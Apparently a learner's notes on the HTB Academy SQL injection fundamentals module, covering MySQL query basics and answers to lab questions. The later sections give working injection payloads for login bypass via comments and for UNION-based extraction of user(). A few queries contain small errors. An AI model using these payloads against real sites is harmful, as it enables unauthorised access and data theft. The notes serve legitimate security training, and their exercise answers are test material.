#HTB academy SQL INJECTION FUNDAMENTALS 

## 1. Connect to mysql of host 
```cmd
mysql -u admin -h 192.168.1.1 -P 3111 -p 
```
## 2. Command line query
### DATABASE 
SHOW
```sql
SHOW DATABASES;
```
USE 
```sql
USE name_database;
```
TABLE
```sql
SHOW TABLES;
```

## 3. Query record in table
### Sorting Results
- **ORDER BY** name_column_sort

```sql
SELECT * FROM logins ORDER BY password;
```

### LIMIT results
- **LIMIT** number_results_record or  **LIMIT** number_begin,number_end
- the first record starting from 0 

```sql
SELECT * FROM logins LIMIT 2;

SELECT * FROM logins LIMIT 1, 2;  #id 2,3 
```

### WHERE Clause
WHERE <condition>
```sql
SELECT * FROM logins WHERE id > 1;

SELECT * FROM logins where username = 'admin';
```
  
### LIKE Clause
WHERE column_name **LIKE** 'admi%'
```sql
SELECT * FROM logins WHERE username LIKE 'admin%';
```

## 4. Questions
### question 1:
What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?
  
### answer 1:
```sql
select last_name  from employees where first_name like  'Bar%' and hire_date= '1990-01-01';
```  
 
### question 2:
In the 'titles' table, what is the number of records WHERE the employee number is greater than 200000 OR their title does NOT contain 'engineer'?

### answer 2:
```sql
select * from titles where emp_no > 200000 or title not Like '%Engineer%';
``` 
  
## 5. Subverting Query Logic (SQLI)
### Comments 
```
#
-- -
/**/
```  
### question 1: 
Login as the user tom 

### answer 1:  
```sql
SELECT * FROM logins WHERE username='tom'-- ' AND password = 'something';  
```  
Payload bypass: user: `tom'-- -`

### question 2: 
Login as the user with the id 5 

### answer 2:  
```sql
SELECT * FROM logins WHERE (username='zev' or id=5)-- -' AND id > 1) AND password = '202cb962ac59075b964b07152d234b70';
```
  
This query will prevent anyone from logging in as admin (with id admin=1 ) 
  
We see that the password was hashed in this query and this will prevent us inject in the password field 
  
Payload bypass: user: `zev' or id=5)-- -`

## 6. Union Clause  
A **UNION** statement can only operate on SELECT statements with an equal number of columns.
### Even columns 
Table ports has 2 columns and table ships also has 2 columns

```sql
SELECT * FROM ports UNION SELECT * FROM ships;  
```  

### Un-even Columns
Table ports has 2 columns and table ships also has 3 columns

```sql
SELECT * FROM ports UNION SELECT ship,city FROM ships;  
  
SELECT  code,city,3 UNION SELECT * FROM ships; 
```    
  
### question 1: 
Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.

### answer 1:
- show databases;
- use employees;
- show tables;
- describe employee;    => 6 column
- describe departments  => 2 column
  
Payload : `select * from employees union select dep_no,dep_name,3,4,5,6 from departments;`
  
### question 2:
Use a Union injection to get the result of 'user()'

### answer 2:
- Check column in table
  
`' order by 4-- -`
- inject user()
  
`' union select 1,2,3,user()-- -`
